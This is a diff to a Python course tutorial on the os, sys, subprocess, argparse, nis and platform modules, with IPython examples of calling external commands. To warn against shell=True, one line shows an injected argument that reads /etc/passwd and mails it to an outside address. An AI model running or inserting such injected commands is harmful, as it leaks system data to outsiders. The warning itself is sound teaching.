@@ -6,25 +6,21 @@
   * sys.argv
   * sys.exit
   * misc stuff
-* [argparse module](#argparse-module)
-* [nis module](#nis-module)
-* [platform module](#platform-module)
 * [subprocess module](#subprocess-module)
   * [shell or no shell](#shell-or-no-shell)
-  * [sp.check_output](#sp-check-output)
+  * [sp.call](#sp-call)
   * [sp.check_call](#sp-check-call)
+  * [sp.check_output](#sp-check-output)
   * [sp.Popen](#sp-popen)
-    * Popen.poll()
-    * Popen.wait()
-    * Popen.communicate()
-    * Popen.terminate()
-    * Popen.kill()
-    * stdin, stdout, stderr...
-    * Popen.returncode
-   
+    * Popen.poll, wait, communicate, terminate, kill, stdin, stdout, stderr, returncode
+* [argparse module](#argparse-module)
+* [nis module](#nis-module)
+* [platform module](#platform-module)     
   
   
 https://docs.python.org/2/library/filesys.html  
+  
+Sometimes, we need to modify environment variables and the PATH in order to get the needed/expected behavior of an exernal command/program that we need to run. For example, we might use subprocess to run a few lines of bash code to source something and run a tool; but we need to make sure the PATH is correct to give our tool the correct version of GCC, or for it to find any tools it needs to run.  We might need to set environmetn variables to trigger certain behavior in another program that we're calling.  This secion is all about doing that, and then how to call external tools/commands!
   
 # os module
 More os module things that weren't covered in teh files and paths content. What you see set will vary depending on your OS and more...
@@ -146,10 +142,183 @@ Out[33]: sys.float_info(max=1.7976931348623157e+308, max_exp=1024, max_10_exp=30
 In [27]: sys.getrecursionlimit()
 Out[27]: 1000
 ```
-
-# argparse module
   
-stuff goes here  
+# subprocess module
+This is a big one!  This has everything you need (probably) to make system calls from python and execute any random commands needed when your program runs.  
+  
+It's easy to abuse subprocess - don't use it for thigns that you should be using libraries for, like editing files, permissions, etc.  
+
+Finally, subprocess can be a bit complex, depending on your needs, so it has a learning curve, but it's pretty friendly once you figure it out.  
+  
+https://docs.python.org/2/library/subprocess.html#replacing-older-functions-with-the-subprocess-module  
+  
+## shell or no shell?
+**Command format without using the shell to execute the command**:
+`['/som/path/my_command', '--arg1', 'val1', '--arg2', ...]`  
+The command and each argument are separate strings in a list.  This is 100% the safest way to run anything with subprocess since it removes the possiblity that an unintended bit of code can get executed by the shell.  It makes it pretty simple to build commands, too... just keep appending args to the list until you have everything you need. 
+
+**Command format with shell**:
+`'''
+source /blah/some_file.sh
+/some/path/another_command --arg1 val1 --arg2 ...
+'''`  
+This is the one situation I can think of where it's important to be able to use `shell=True` when executing a command.  If I need to source some scripts to set up the environment for the command I'm going to run, then I don't see a good way around it (except maybe writing a wrapper to capture shell changes from the source and setting them before calling another command)...  
+  
+Anyway, try not to do that since, in situations where you external files or input can affect what you run, there is opporutnity to accidentally run stuff like this:
+`/some/path/another_command --arg1 $(cat /etc/passwd | mail -s h4x0red_by joe@blow.com; echo actual_arg) --arg2 ...`  
+And the shell will execute any of the nested commands, leaving you vulnerable.  
+  
+## sp.call
+**Run a command and return the exit status**
+* No exception raised if the exit status is not zero (non-zero exit status from a command means there was an error)
+* FileNotFoundError exception raised if command does not exist. 
+* This is blocking - python will stay at this command until it completes; then move on. 
+```python
+In [85]: sp.call(['/bin/true'])
+Out[85]: 0  <- It returned the exit status!
+
+In [86]: sp.call(['/bin/false'])
+Out[86]: 1  <- non-zero exit status means error; false is error!
+
+In [87]: sp.call(['/bin/doesnt-exist'])
+'---------------------------------------------------------------------------
+FileNotFoundError                         Traceback (most recent call last)
+```
+## sp.check_call
+**Use this if you want an exception on non-zero exit status**
+* Raises sp.CalledProcessErroron non-zero returncode
+* Raises FileNotFoundError if command doesn't exist
+* This is blocking
+  
+**Example with non-zero return code:**  
+```python
+In [101]: try:
+     ...:     sp.check_call(['/bin/false'])
+     ...: except sp.CalledProcessError as e:
+     ...:     print("MESSAGE WAS:", e)
+     ...:     print("Exit Status was:", e.returncode)
+     ...: except FileNotFoundError as e:
+     ...:     print("MESSAGE WAS:", e)
+     ...:     
+MESSAGE WAS: Command '['/bin/false']' returned non-zero exit status 1.
+Exit Status was: 1
+```
+**Example with invalid command**  
+```python
+In [102]: try:
+     ...:     sp.check_call(['/bin/some_foobar'])
+     ...: except sp.CalledProcessError as e:
+     ...:     print("MESSAGE WAS:", e)
+     ...:     print("Exit Status was:", e.returncode)
+     ...: except FileNotFoundError as e:
+     ...:     print("MESSAGE WAS:", e)
+     ...:     
+MESSAGE WAS: [Errno 2] No such file or directory: '/bin/some_foobar'
+```
+**Exmaple where it works as expected
+In [103]: try:
+     ...:     sp.check_call(['/bin/true'])
+     ...: except sp.CalledProcessError as e:
+     ...:     print("MESSAGE WAS:", e)
+     ...:     print("Exit Status was:", e.returncode)
+     ...: except FileNotFoundError as e:
+     ...:     print("MESSAGE WAS:", e)
+     ...:     
+
+In [104]: 
+
+## sp.check_output
+**Run a command and return it's output.**
+* Raises sp.CalledProcessErroron non-zero returncode
+* Raises FileNotFoundError if command doesn't exist
+* This is blocking - python will stay at this command until it completes; then move on.  
+```python
+In [106]: try:
+     ...:     output = sp.check_output(['ls', '-ld'])
+     ...:     print("OUTPUT WAS:", output)
+     ...: except sp.CalledProcessError as e:
+     ...:     print("MESSAGE WAS:", e)
+     ...:     print("Exit Status was:", e.returncode)
+     ...: except FileNotFoundError as e:
+     ...:     print("MESSAGE WAS:", e)
+     ...:     
+OUTPUT WAS: b'drwxrwxr-x 2 drnorris drnorris 4096 Oct 28 11:02 .\n'
+
+In [107]: 
+```
+
+## sp.Popen
+**This is the monster :)**
+* NON-blocking, so you can run multiple commands in teh background concurrently if you want...
+* Raises FileNotFoundError if command not found...
+* Let's you redirect, capture, and chain-together stdin, stdout, stder from each process. 
+We aren't giong to use this much here, but you should read about it!  
+  
+# argparse module
+I'm kind of used to seeing people put argparse stuff at the top of their program in global namespace, but that's not really necessary; we can put it all into a function and call it at runtime to have the given argumetns processed.  
+  
+Argparse works on the same data available to use in `sys.argv`, so we can reference the given args ourselves before calling argparse, which can be useful if we wan to set global obtions like "DEBUG", at the top of our program, but still use argparse to handle all of the detailed arg stuff.  
+  
+You'll have to go through the documentation if you want to do anything fancy w/ argparse: https://docs.python.org/3/library/argparse.html  
+  
+Here's a simple example you can start with in your own code:
+```python
+.../EXAMPLES> cat args.py 
+#!/usr/bin/env python
+
+import argparse
+import sys
+
+if '--debug' in sys.argv:
+    print('We can check for specific args outside of argparse.\n')
+    DEBUG=True
+
+def getArgs():
+    parser = argparse.ArgumentParser(
+        prog=sys.argv[0],
+        description="Test Program for Argparse\nThese sorts of things can be\nvery exciting.",
+        epilog="And now, you know the rest of the story!")
+    parser.add_argument('--verbose', '-v', help="verbose mode", action='count')
+    parser.add_argument('--debug', help="debug mode", action='store_true')
+    parser.add_argument('--widgets', type=int, help="number of widgets", action='store')
+
+    args = parser.parse_args()
+    return args
+
+if __name__ == '__main__':
+    args = getArgs()
+    print("ARGS ARE:")
+    print(args)
+```
+  
+And a couple examples of it's output:  
+```
+.../EXAMPLES$ ./args.py --help
+usage: ./args.py [-h] [--verbose] [--debug] [--widgets WIDGETS]
+
+Test Program for Argparse These sorts of things can be very exciting.
+
+optional arguments:
+  -h, --help         show this help message and exit
+  --verbose, -v      verbose mode
+  --debug            debug mode
+  --widgets WIDGETS  number of widgets
+
+And now, you know the rest of the story!
+```
+```
+../EXAMPLES> ./args.py --debug
+We can check for specific args outside of argparse.
+
+ARGS ARE:
+Namespace(debug=True, verbose=None, widgets=None)
+```
+```
+.../EXAMPLES> ./args.py -vv --widgets 42
+ARGS ARE:
+Namespace(debug=False, verbose=2, widgets=42)
+drnorris@dadesktop:~/git/python_class/EXAMPLES$ 
+```
   
 # nis module
 NIS is Network Information Service - sort of an extensin of the local system passwd, group, netgroup, etc files that are used for tracking users, groups, and other system information.  NIS is a distributed service for this content that's still used in industry today... The usage is pretty simple:
@@ -162,6 +331,7 @@ Out[37]: 'thedude:passwordhash:1000:15:just.the.dude:/usr/users/home0/thedude:/b
 In [38]: nis.match('users', 'group')
 Out[38]: 'users::15:thedude,andothers
 ```
+  
 # platform module
 Sort of the python equivelant of the uname command.  Also has pointeres to some important libraries that python needs.  
 ```python
@@ -190,63 +360,4 @@ Out[58]: 'Linux'
 
 In [59]: platform.release()
 Out[59]: '3.0.101-107-default'
-```
-  
-# subprocess module
-This is a big one!  This has everything you need (probably) to make system calls from python and execute any random commands needed when your program runs.  
-  
-It's easy to abuse subprocess - don't use it for thigns that you should be using libraries for, like editing files, permissions, etc.  
-  
-https://docs.python.org/2/library/subprocess.html#replacing-older-functions-with-the-subprocess-module  
-  
-## shell or no shell?
-  
-## sp.check_output
-**Use this as a simple way to capture output from a command. **
-```python
-In [62]: output = sp.check_output(['ls', '-ld', '.'])
-
-In [63]: print output
-drwxr-sr-x 53 thedude users 16384 Oct 18 08:56 .
-
-In [64]: 
-```
-If you pass it an invalid command, it will raise an exception!  This will cause your production code to crash, so you have to either validate your commands before running them, including permiossions to run them, or call them from a try block.
-```
-In [64]: output = sp.check_output(['zls', '-ld', '.'])
----------------------------------------------------------------------------
-OSError                                   Traceback (most recent call last)
-<ipython-input-64-7a025d6680d7> in <module>()
-----> 1 output = sp.check_output(['zls', '-ld', '.'])
-...
-
-OSError: [Errno 2] No such file or directory
-
-In [65]: 
-```
-The same thing happens if the command you run returns a non-zero exit status!
-```python
-In [66]: sp.check_output(['false'])
----------------------------------------------------------------------------
-CalledProcessError                        Traceback (most recent call last)
-<ipython-input-66-ffd39565651e> in <module>()
-----> 1 sp.check_output(['false'])
-...
-CalledProcessError: Command '['false']' returned non-zero exit status 1
-
-In [67]: 
-
-```
-Notice the differnet exceptoins raised?  
-```python
-In [68]: try:
-    ...:     sp.check_output(['false'])
-    ...: except sp.CalledProcessError, e:
-    ...:     print "the command returned non-zer exit status for failure"
-    ...: except OSError, e:
-    ...:     print "the command was not found or not accessible"
-    ...:     
-the command returned non-zer exit status for failure
-
-In [69]: 
 ```
